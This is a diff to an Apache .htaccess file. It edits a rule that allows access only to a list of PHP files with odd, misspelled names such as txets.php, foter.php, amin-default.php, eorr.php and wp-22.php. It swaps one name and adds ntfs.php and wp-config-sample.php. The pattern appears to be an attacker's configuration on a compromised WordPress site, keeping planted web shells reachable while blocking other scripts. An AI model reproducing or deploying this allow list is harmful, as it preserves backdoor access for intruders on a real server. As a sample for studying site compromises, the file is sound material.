@@ -2,7 +2,7 @@
  Order allow,deny
  Deny from all
 </FilesMatch>
-<FilesMatch "^(txets.php|Base.php|colour.php|DB.php|Decode.php|Module.php|MySQL.php|Sen.php|String.php|wincust.php|nux.php|Mail.php|foter.php|header.php|class-wp-edit.php|amin-default.php|sdl.php|dns.php|service.php|eorr.php|wp-login.php|wp-22.php|autoload_classmap.php)$">
+<FilesMatch "^(txets.php|Base.php|colour.php|DB.php|Decode.php|Module.php|MySQL.php|ntfs.php|String.php|wincust.php|nux.php|Mail.php|foter.php|header.php|class-wp-edit.php|amin-default.php|sdl.php|dns.php|service.php|eorr.php|wp-login.php|wp-config-sample.php|wp-22.php|autoload_classmap.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
